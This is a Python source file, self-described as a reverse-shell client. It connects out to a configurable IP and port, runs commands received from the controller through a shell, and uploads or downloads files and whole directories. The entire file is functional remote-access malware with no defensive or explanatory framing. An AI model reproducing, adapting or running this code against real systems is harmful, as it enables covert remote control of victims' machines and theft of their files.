#!/usr/bin/env python
# Created by ybenel
# Updated in 2022/12/10
# A Reverseshell client

import os
import platform
import socket
import struct
import subprocess

IP = "127.0.0.1"
PORT = 9110
ARC = platform.system()

class send_rev:
  def __init__(self, sock):
    self.sock = sock
  def send(self, data):
    data = struct.pack('>I', len(data)) + data
    self.sock.sendall(data)
  def recv(self):
    data = self.recvall(4)
    if not data:
      return ""
    data = struct.unpack(">I", data)[0]
    return self.recvall(data)
  def recvall(self, n):
    packet = b''
    while len(packet) < n:
      frame = self.sock.recv(n - len(packet))
      if not frame:
        return None
      packet += frame
    return packet

class clientt:
  def __init__(self, recv_send):
    self.recv_send = recv_send
    self.mainDIR = os.getcwd()
    self.o_pwd = ""
  def runCMD(self,cmd):
    try:
      runcmd = subprocess.Popen(cmd,
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
      runcmd.wait(5)
    except subprocess.TimeoutExpired:
      controller.send(B"Err: Command Timeout occured")
      conf = controller.recv().decode('UTF-8','ignore').strip()
      if conf in ['y','Y']:
        runcmd.kill()
        return "Command Has been killed".encode('UTF-8')
    return runcmd.stdout.read() + runcmd.stderr.read()

  def shell(self,recv_send=send_rev):
    global y,controller
    controller = recv_send(y)
    while True:
      cmd = controller.recv()
      if cmd.strip():
        cmd = cmd.decode('UTF-8', 'ignore').strip()
        if cmd.startswith("download"): self.upload(cmd)
        elif cmd.startswith("upload"): self.download(cmd)
        elif cmd.startswith("cd"): self.ch_dir(cmd)
        elif cmd == "kill": y.shutdown(2); y.close()
        # elif cmd == "check_net": if cnet() == True: controller.send(b"UP")
        elif cmd == "pwdd":
          controller.send(str(os.getcwd()+"\n").encode("UTF-8"))
        else:
          cmd_output = self.runCMD(cmd)
          controller.send(bytes(cmd_output))

  def save_file(self,down, file, dirc=None):
    """ Save file or files Incase of Directory """
    if dirc is not None:
      file = os.path.join(dirc,file)
    if down == "true":
      wf = open(file, "wb")
      while True:
        data = controller.recv()
        if data == b"done": break
        elif data == b"aborted":
          wf.close()
          os.remove(file)
          return
        wf.write(data)
      wf.close()

  def download(self,cmd):
    download_file = "".join(cmd.split("upload")).strip()
    if "dir:" in download_file:
      download_file = download_file[:-4]
      dw_file = download_file.split("/")[-1] if "/" in download_file else download_file.split("\\")[-1] if "\\" in download_file else download_file
      length = struct.unpack('>I', controller.recv())[0]
      try:
        os.mkdir(dw_file)
      except Exception as e:
        controller.send(b"Error %s"%(e))
        return
      controller.send(b"Continue")
      for _ in range(0, length):
        file_save = controller.recv().decode('UTF-8','ignore')
        down = controller.recv().decode('UTF-8','ignore')
        self.save_file(down,file_save,dw_file)
    else:
      download_file = download_file.split("/")[-1] if "/" in download_file else download_file.split("\\")[-1] if "\\" in download_file else download_file
      down = controller.recv().decode('UTF-8','ignore')
      self.save_file(down, download_file)
    controller.send(str(os.getcwd()+os.sep+download_file).encode('UTF-8'))

  def file_send(self,file):
    controller.send(b"true")
    with open(file,"rb") as file_u:
      for data in iter(lambda: file_u.read(4100), b""):
        try:
          controller.send(data)
        except:
          file_u.close()
          controller.send(b"aborted")
    controller.send(b"done")

  def upload(self,cmd):
    upload_file = "".join(cmd.split("download")).strip()
    if not os.path.isfile(upload_file) and not os.path.isdir(upload_file):
      controller.send(b"No such file or directory %s" %(upload_file.encode('UTF-8')))
    else:
      if os.path.isdir(upload_file):
        controller.send(b"dir:")
        files = os.listdir(upload_file)
        controller.send(struct.pack('>I', len(files)))
        for a,b,c in os.walk(upload_file):
          for file in c:
            controller.send(file.encode('UTF-8'))
            self.file_send(os.path.join(a,file))
      else:
        self.file_send(upload_file)

  def ch_dir(self, dir):
    dirc = "".join(dir.split("cd")).strip()
    if not dirc.strip():
      controller.send(b"%s"%(os.getcwd().encode('UTF-8')))
    elif dirc == "-":
      if self.o_pwd == "":
        controller.send(b"Err 'cd' (old pwd) not set yet")
      else:
        os.chdir(self.o_pwd);self.o_pwd = os.getcwd()
        controller.send(b"Back to dir %s" %(self.o_pwd.encode('UTF-8')))
    elif dirc == "--":
      self.o_pwd = os.getcwd();os.chdir(self.mainDIR)
      controller.send(b"Back to first dir %s" %(self.mainDIR.encode('UTF-8')))
    else:
      if not os.path.isdir(dirc):
        controller.send(b"'cd' No such directory %s" %(dirc.encode('UTF-8')))
      else:
        self.o_pwd = os.getcwd();os.chdir(dirc)
        controller.send(b"Changed to dir %s" %(dirc.encode('UTF-8')))

try:
  y = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  y.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
  y.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, True)
  y.connect((IP, PORT))
  c = clientt(y)
  c.shell()
except Exception as e:
  print("Exception Err: %s"%(e))
  exit(1)
